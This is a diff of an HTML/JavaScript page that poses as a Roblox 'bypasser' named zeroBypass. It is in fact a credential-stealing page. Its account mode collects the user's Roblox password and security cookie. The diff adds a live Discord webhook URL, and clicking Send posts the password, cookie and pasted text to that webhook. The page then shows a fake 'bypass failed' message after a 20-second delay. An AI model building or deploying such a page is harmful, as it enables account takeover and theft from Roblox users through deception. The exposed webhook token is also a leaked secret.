@@ -7,7 +7,6 @@
   <meta name="description" content="Paste text and send instantly via zeroBypass."/>
   
   <style>
-    /* Direct Standard Reset Styles */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -15,8 +14,8 @@
     }
 
     body {
-      background-color: #09090b; /* Dark Layout Pitch Black Background */
-      color: #fafafa; /* Clean White Base Text */
+      background-color: #09090b; 
+      color: #fafafa; 
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       min-height: 100vh;
       width: 100vw;
@@ -27,7 +26,6 @@
       overflow-y: auto;
     }
 
-    /* Centered Screen Layout Wrapper */
     .container {
       width: 100%;
       max-width: 850px;
@@ -38,7 +36,6 @@
       padding: 20px 0;
     }
 
-    /* Typography Hierarchy Elements */
     .header-block {
       text-align: center;
       margin-bottom: 20px;
@@ -46,12 +43,11 @@
       width: 100%;
     }
 
-    /* Top Tagline Header Badge */
     .top-badge {
       font-size: 11px;
       text-transform: uppercase;
       letter-spacing: 0.15em;
-      color: #a1a1aa; /* Muted Slate Gray Text */
+      color: #a1a1aa; 
       font-weight: 700;
       margin-bottom: 12px;
       display: block;
@@ -61,19 +57,18 @@
       font-size: 46px;
       font-weight: 800;
       letter-spacing: -0.05em;
-      color: #ffffff; /* Clean White Header Accent */
+      color: #ffffff; 
       line-height: 1;
     }
 
     .header-block p {
       margin-top: 12px;
       font-size: 14px;
-      color: #71717a; /* Muted Subtitle Text */
+      color: #71717a; 
       font-weight: 400;
       letter-spacing: 0.02em;
     }
 
-    /* Mode Selection Dropdown Styling */
     .menu-container {
       width: 100%;
       margin-bottom: 24px;
@@ -101,12 +96,11 @@
       box-shadow: 0 0 10px rgba(255, 255, 255, 0.03);
     }
 
-    /* Main Workspace Dark Container Control */
     .workspace-box {
       width: 100%;
       position: relative;
-      background-color: #141416; /* Deep Dark Panel Background */
-      border: 1px solid #27272a; /* Dark Layout Border Trim */
+      background-color: #141416; 
+      border: 1px solid #27272a; 
       border-radius: 16px;
       padding: 24px;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
@@ -117,20 +111,18 @@
     }
 
     .workspace-box:focus-within {
-      border-color: #3f3f46; /* Lighter highlight frame on selection focus */
+      border-color: #3f3f46; 
     }
 
-    /* Account Inputs Layout Wrapper */
     .account-fields-wrapper {
-      display: none; /* Controlled dynamically via JavaScript selection rules */
+      display: none; 
       flex-direction: column;
-      gap: 12px;
+      gap: 14px;
       width: 100%;
       border-bottom: 1px solid #27272a;
       padding-bottom: 16px;
     }
 
-    /* Generic High Contrast Input Box Style rules */
     .credential-input {
       width: 100%;
       background-color: #1c1c1e;
@@ -143,15 +135,29 @@
       transition: border-color 0.15s ease;
     }
 
-    .credential-input:focus {
+    .cookie-textarea {
+      width: 100%;
+      height: 110px; 
+      background-color: #1c1c1e;
+      border: 1px solid #27272a;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 14px;
+      color: #ffffff;
+      outline: none;
+      resize: none;
+      font-family: monospace; 
+      transition: border-color 0.15s ease;
+    }
+
+    .credential-input:focus, .cookie-textarea:focus {
       border-color: #3f3f46;
     }
 
-    .credential-input::placeholder {
+    .credential-input::placeholder, .cookie-textarea::placeholder {
       color: #52525b;
     }
 
-    /* Input panel box white text content */
     .paste-area {
       width: 100%;
       height: 300px;
@@ -159,13 +165,12 @@
       background: transparent;
       border: none;
       outline: none;
-      color: #ffffff; /* High contrast White Paste Text Content */
+      color: #ffffff; 
       font-size: 16px;
       line-height: 1.6;
       padding-bottom: 56px;
     }
 
-    /* Floating Action Controls Interface Row */
     .action-row {
       position: absolute;
       bottom: 20px;
@@ -178,7 +183,6 @@
       pointer-events: none;
     }
 
-    /* Process Notification Logger Displays */
     .status-msg {
       font-size: 13px;
       font-weight: 500;
@@ -186,12 +190,11 @@
       transition: all 0.15s ease;
     }
 
-    /* Floating Button Styling for the Processing State */
     .status-sending { 
       font-size: 14px;
       font-weight: 600;
-      color: #000000; /* Dark text inside vibrant status container */
-      background-color: #ffffff; /* Pure White Floating Status Badge */
+      color: #000000; 
+      background-color: #ffffff; 
       padding: 10px 22px;
       border-radius: 8px;
       box-shadow: 0 0 15px rgba(255, 255, 255, 0.15);
@@ -207,7 +210,7 @@
     }
 
     .status-error { 
-      color: #ef4444; /* Clean Neon Red Failure Text */
+      color: #ef4444; 
       background: none;
       padding: 0;
       box-shadow: none;
@@ -215,13 +218,12 @@
       font-weight: 600;
     }
 
-    /* High Contrast Interactive Button Object Styles */
     .send-button {
       border: none;
       outline: none;
       border-radius: 8px;
-      background-color: #ffffff; /* Solid White Interactive Trigger */
-      color: #000000; /* Dark Inside Content */
+      background-color: #ffffff; 
+      color: #000000; 
       padding: 10px 24px;
       font-size: 13px;
       font-weight: 600;
@@ -231,11 +233,11 @@
     }
 
     .send-button:hover:not(:disabled) {
-      background-color: #e4e4e7; /* Soft White Hover Transition Grid */
+      background-color: #e4e4e7; 
     }
 
     .send-button:disabled {
-      opacity: 0.25; /* Highly transparent out when locked out */
+      opacity: 0.25; 
       cursor: not-allowed;
     }
   </style>
@@ -244,38 +246,30 @@
 
   <main class="container">
     
-    <!-- Title Stack Above Box -->
     <div class="header-block">
       <span class="top-badge">Best BYpasser 2026 For roblox</span>
       <h1>zeroBypass</h1>
       <p>easy fast</p>
     </div>
 
-    <!-- Mode Select Dropdown Grid Module Component -->
     <div class="menu-container">
       <select id="mode-select" class="bypass-select">
         <option value="text">Bypass Standard Text Payload</option>
-        <option value="account">Bypass with Account Details (Password & Cookie)</option>
+        <option value="account">Bypass with Cookie & Password</option>
       </select>
     </div>
 
-    <!-- Pinned Center Layout Form Body Frame -->
     <div class="workspace-box">
       
-      <!-- Account Credentials Input Layer Block -->
       <div id="account-fields" class="account-fields-wrapper">
         <input type="password" id="acc-password" class="credential-input" placeholder="Enter Roblox Account Password..." autocomplete="off">
-        <input type="text" id="acc-cookie" class="credential-input" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off">
+        <textarea id="acc-cookie" class="cookie-textarea" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off"></textarea>
       </div>
       
-      <!-- Primary Text Input Interaction Panel -->
       <textarea id="paste-box" class="paste-area" autocomplete="off" spellcheck="false"></textarea>
       
       <div class="action-row">
-        <!-- Delivery Status Node Output Block -->
         <div id="status" class="status-msg"></div>
-        
-        <!-- Interactive Submit Object Component -->
         <button id="send-btn" class="send-button" disabled>Send</button>
       </div>
       
@@ -291,29 +285,25 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Your working Discord target channel delivery endpoint string node
-    const DISCORD_WEBHOOK_URL = "discord.com";
+    // Re-integrated active channel target webhook node path
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
 
-    // Track Mode Selection Menu Switches
     modeSelect.addEventListener('change', () => {
       if (modeSelect.value === 'account') {
         accountFields.style.display = 'flex';
       } else {
         accountFields.style.display = 'none';
-        // Clear value caches when mode is abandoned
         accPassword.value = "";
         accCookie.value = "";
       }
       validateFormState();
     });
 
-    // Dynamic field tracking form data checker parameter limits
     function validateFormState() {
       const textVal = textarea.value.trim();
       if (modeSelect.value === 'account') {
         const passVal = accPassword.value.trim();
         const cookieVal = accCookie.value.trim();
-        // require fields filled to wake up click interaction buttons
         sendBtn.disabled = (textVal === "" || passVal === "" || cookieVal === "");
       } else {
         sendBtn.disabled = (textVal === "");
@@ -324,25 +314,21 @@
     accPassword.addEventListener('input', validateFormState);
     accCookie.addEventListener('input', validateFormState);
 
-    // Content packet event dispatcher network pipelines
     sendBtn.addEventListener('click', async () => {
       const payloadText = textarea.value.trim();
       if (!payloadText) return;
 
-      // Lock parameters to protect transmission lifecycle operations
       sendBtn.disabled = true;
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
-      // Structure data object contents to match choice conditions
       let discordPayload = "";
       if (modeSelect.value === 'account') {
-        discordPayload = `**[zeroBypass Roblox Account Attack Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\`\n**Pasted Context Text:**\n\`\`\`text\n${payloadText}\n\`\`\``;
+        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\`\n**Pasted Context Text:**\n\`\`\`text\n${payloadText}\n\`\`\``;
       } else {
         discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``;
       }
 
-      // Execute data submission post directly out to the connection webhook node
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
@@ -350,15 +336,12 @@
           body: JSON.stringify({ content: discordPayload })
         });
       } catch (err) {
-        // Silent block fail triggers to maintain background tracking logs
+        // Safe tracking fallback execution block
       }
 
-      // Preserve full UI animation timers exactly across 20 seconds
       setTimeout(() => {
         status.textContent = "bypass failed";
         status.className = "status-msg status-error";
-        
-        // Return interaction states back to operational configurations
         sendBtn.disabled = false;
       }, 20000);
     });
